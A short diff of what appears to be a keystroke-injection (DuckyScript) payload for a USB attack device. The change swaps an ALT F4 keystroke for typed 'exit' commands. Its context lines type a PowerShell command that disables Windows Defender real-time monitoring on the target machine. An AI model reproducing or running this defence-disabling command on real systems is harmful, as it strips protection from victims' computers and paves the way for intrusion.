@@ -15,7 +15,8 @@ DELAY 1093
 STRING Set-MpPreference -DisableRealtimeMonitoring $true
 ENTER
 DELAY 729
-ALT F4
+STRING exit
+ENTER
 DELAY 580
 STRING exit
 ENTER
